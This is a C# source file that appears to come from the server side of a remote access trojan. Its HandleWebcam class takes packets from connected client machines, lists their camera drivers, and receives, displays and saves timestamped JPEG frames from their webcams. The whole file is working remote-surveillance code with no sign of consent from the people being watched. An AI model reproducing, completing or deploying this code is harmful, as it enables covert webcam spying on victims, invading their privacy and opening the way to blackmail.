using Server.Forms;
using Server.Helper;
using Server.MessagePack;
using Server.Connection;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing.Imaging;

namespace Server.Handle_Packet
{
    class HandleWebcam
    {
        public HandleWebcam(MsgPack unpack_msgpack, Clients client)
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "getWebcams":
                    {
                        FormWebcam webcam = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        try
                        {
                            if (webcam != null)
                            {
                                webcam.Client = client;
                                webcam.timer1.Start();
                                foreach (string camDriver in unpack_msgpack.ForcePathObject("List").AsString.Split(new[] { "-=>" }, StringSplitOptions.None))
                                {
                                    if (!string.IsNullOrWhiteSpace(camDriver))
                                        webcam.comboBox1.Items.Add(camDriver);
                                }
                                webcam.comboBox1.SelectedIndex = 0;
                                webcam.labelWait.Visible = false;
                                if (webcam.comboBox1.Text != "None")
                                {
                                    webcam.comboBox1.Enabled = true;
                                    webcam.button1.Enabled = true;
                                    webcam.btnSave.Enabled = true;
                                    webcam.numericUpDown1.Enabled = true;
                                }
                                else
                                {
                                    client.Disconnected();
                                }
                            }
                            else
                            {
                                client.Disconnected();
                            }
                        }
                        catch { }
                        break;
                    }

                case "capture":
                    {
                        FormWebcam webcam = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        try
                        {
                            if (webcam != null)
                            {
                                using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                                {
                                    Image image = (Image)Image.FromStream(memoryStream).Clone();
                                    if (webcam.RenderSW.ElapsedMilliseconds >= (1000 / 20))
                                    {
                                        webcam.pictureBox1.Image = image;
                                        webcam.RenderSW = Stopwatch.StartNew();
                                    }
                                    webcam.FPS++;
                                    if (webcam.sw.ElapsedMilliseconds >= 1000)
                                    {
                                        if (webcam.SaveIt)
                                        {
                                            if (!Directory.Exists(webcam.FullPath))
                                                Directory.CreateDirectory(webcam.FullPath);
                                            webcam.pictureBox1.Image.Save(webcam.FullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg", ImageFormat.Jpeg);
                                        }
                                        webcam.Text = "Webcam:" + unpack_msgpack.ForcePathObject("ID").AsString + "    FPS:" + webcam.FPS + "    Screen:" + image.Width + " x " + image.Height + "    Size:" + Methods.BytesToString(memoryStream.Length);
                                        webcam.FPS = 0;
                                        webcam.sw = Stopwatch.StartNew();
                                    }
                                }
                            }
                            else
                            {
                                client.Disconnected();
                            }
                        }
                        catch { }
                        break;
                    }
            }
        }
    }
}
